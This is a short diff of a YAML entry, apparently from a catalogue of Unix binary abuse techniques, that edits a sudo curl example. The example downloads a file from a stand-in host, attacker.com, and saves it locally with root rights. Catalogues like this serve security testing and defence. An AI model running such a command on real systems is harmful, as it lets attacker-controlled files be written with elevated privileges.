@@ -28,5 +28,5 @@ functions:
       code: |
         URL=http://attacker.com/file_to_get
         LFILE=file_to_save
-        sudo -E curl $URL -o $LFILE
+        sudo curl $URL -o $LFILE
 ---
